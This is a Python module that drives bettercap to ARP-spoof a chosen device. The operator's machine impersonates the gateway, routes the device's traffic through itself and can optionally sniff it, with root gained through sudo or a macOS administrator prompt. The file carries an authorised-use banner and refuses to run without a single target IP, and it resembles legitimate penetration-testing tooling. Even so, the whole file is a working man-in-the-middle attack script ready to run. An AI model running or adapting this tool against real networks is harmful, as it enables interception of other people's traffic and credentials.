"""
netreg_mitm.py -- route a device's traffic through this machine (ARP spoofing).

====================  OWN-NETWORK / AUTHORIZED USE ONLY  ====================
This makes your computer impersonate the router (the gateway) so a chosen
device's traffic flows through your machine. It is lawful ONLY on a network you
own or are explicitly authorized to test. The GUI gates it behind an explicit
confirmation; this module refuses to build a command without a target.
============================================================================

Implementation: we drive **bettercap** (install with `brew install bettercap`).
bettercap's `arp.spoof` module does the gateway impersonation and, on exit,
sends the correct ARP replies to heal the network. bettercap needs root, so on
macOS we launch it through an administrator-privileges prompt.

Most of this module is pure command construction (unit-tested). Actually
starting bettercap needs root + the binary + a real network, so that path is
exercised on the target machine, not in CI.
"""
from __future__ import annotations

import os
import shutil
import signal
import subprocess
import sys
import threading


def bettercap_path() -> str:
    return shutil.which("bettercap") or ""


def available() -> bool:
    """True if bettercap is installed."""
    return bool(bettercap_path())


def preflight() -> tuple[bool, str]:
    """(ready, message). Explains what to install if not ready."""
    if not available():
        return False, ("bettercap is not installed. Install it with "
                       "`brew install bettercap` (the one-click launcher does "
                       "this for you), then try again.")
    return True, "bettercap found."


def build_eval(target_ip: str, full_duplex: bool = True,
               sniff: bool = False) -> str:
    """Build the bettercap -eval command string that impersonates the gateway
    for `target_ip`. Raises ValueError without a target (safety: never spoof
    the whole subnet by accident). bettercap discovers the gateway itself."""
    target_ip = (target_ip or "").strip()
    if not target_ip:
        raise ValueError("a target IP is required (refusing to spoof the whole network)")
    cmds = [
        f"set arp.spoof.targets {target_ip}",
        f"set arp.spoof.fullduplex {'true' if full_duplex else 'false'}",
        "net.probe on",
        "arp.spoof on",
    ]
    if sniff:
        cmds.append("net.sniff on")
    return "; ".join(cmds)


def build_argv(target_ip: str, iface: str | None = None,
               full_duplex: bool = True, sniff: bool = False) -> list[str]:
    """Full bettercap argv (without the privilege wrapper). Verifiable."""
    binary = bettercap_path() or "bettercap"
    argv = [binary]
    if iface:
        argv += ["-iface", iface]
    argv += ["-eval", build_eval(target_ip, full_duplex, sniff)]
    return argv


def _mac_admin_command(argv: list[str]) -> list[str]:
    """Wrap argv so macOS shows a GUI password prompt (osascript). The spoof
    runs in the background; `stop()` kills it by name."""
    # quote each arg for the shell that osascript runs
    quoted = " ".join("'" + a.replace("'", "'\\''") + "'" for a in argv)
    script = f'do shell script "{quoted} &> /dev/null &" with administrator privileges'
    return ["osascript", "-e", script]


class RouteSession:
    """Start/stop routing a target's traffic through this machine.

    Lifecycle: preflight() -> start(target_ip) -> stop(). Always call stop()
    (or let the GUI call it on close) so bettercap heals the ARP tables."""

    def __init__(self, iface: str | None = None):
        self.iface = iface
        self._proc: subprocess.Popen | None = None
        self._target = ""
        self._lock = threading.Lock()

    def is_running(self) -> bool:
        with self._lock:
            if self._proc is None:
                return False
            return self._proc.poll() is None

    def start(self, target_ip: str, full_duplex: bool = True,
              sniff: bool = False) -> tuple[bool, str]:
        ready, msg = preflight()
        if not ready:
            return False, msg
        if self.is_running():
            return False, f"Already routing {self._target} through this machine."
        try:
            argv = build_argv(target_ip, self.iface, full_duplex, sniff)
        except ValueError as e:
            return False, str(e)

        if sys.platform == "darwin":
            launch = _mac_admin_command(argv)  # GUI password prompt
        else:
            launch = ["sudo"] + argv

        try:
            # On macOS the osascript wrapper backgrounds bettercap itself and
            # returns immediately; elsewhere we hold the sudo child handle.
            self._proc = subprocess.Popen(launch, stdout=subprocess.DEVNULL,
                                          stderr=subprocess.DEVNULL)
            self._target = target_ip
        except Exception as e:
            return False, f"Could not start bettercap: {e}"
        return True, (f"Routing {target_ip}'s traffic through this machine "
                      f"(impersonating the gateway). Press Stop to restore the "
                      f"network.")

    def stop(self) -> tuple[bool, str]:
        """Stop spoofing and restore the network."""
        with self._lock:
            proc = self._proc
            self._proc = None
        # terminate the handle we hold (sudo path)
        if proc is not None and proc.poll() is None:
            try:
                proc.terminate()
            except Exception:
                pass
        # the macOS admin path backgrounds bettercap under a different pid, so
        # also ask it to quit by name; bettercap heals ARP on shutdown.
        killed = False
        if shutil.which("pkill"):
            try:
                subprocess.run(["pkill", "-INT", "-x", "bettercap"],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                killed = True
            except Exception:
                killed = False
        if not self._target:
            return True, "Nothing was running."
        target, self._target = self._target, ""
        return True, (f"Stopped routing {target}. bettercap restored the ARP "
                      f"tables; the network is back to normal."
                      + ("" if killed else " (If traffic still routes, quit "
                         "bettercap manually.)"))


if __name__ == "__main__":
    # Safe self-check: command construction only, no bettercap launched.
    print("bettercap available:", available())
    print("eval for 192.168.1.211:", build_eval("192.168.1.211"))
    try:
        build_eval("")
    except ValueError as e:
        print("empty target correctly refused:", e)
